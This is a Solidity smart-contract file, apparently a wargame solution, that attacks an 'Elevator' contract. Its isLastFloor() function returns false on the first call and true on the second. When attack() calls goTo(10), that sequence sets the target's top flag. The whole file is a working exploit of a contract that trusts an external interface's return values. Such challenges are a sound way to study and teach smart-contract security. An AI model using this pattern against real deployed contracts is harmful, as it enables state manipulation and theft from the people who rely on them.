// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Building.sol";

/**
 * @title BuildingAttacker
 * @notice Exploits the Elevator contract by manipulating isLastFloor() return values
 * @dev Implements the Building interface with state-changing behavior on repeated calls
 */
contract BuildingAttacker is Building {
    address public target;
    uint256 private callCount;

    constructor(address _target) {
        target = _target;
    }

    /**
     * @notice Returns different values on subsequent calls to exploit the Elevator
     * @dev First call returns false, second call returns true
     * @return bool - false on first call, true on second call
     */
    function isLastFloor(uint256) external override returns (bool) {
        callCount++;

        // First call: return false to enter the if block
        // Second call: return true to set top = true
        if (callCount == 1) {
            return false;
        } else {
            return true;
        }
    }

    /**
     * @notice Executes the attack on the Elevator contract
     * @dev Calls goTo() which will trigger isLastFloor() twice
     */
    function attack() external {
        // Reset call count for each attack
        callCount = 0;

        // Call the Elevator's goTo function
        // This will call isLastFloor() twice with different results
        (bool success, ) = target.call(abi.encodeWithSignature("goTo(uint256)", 10));
        require(success, "Attack failed");
    }
}
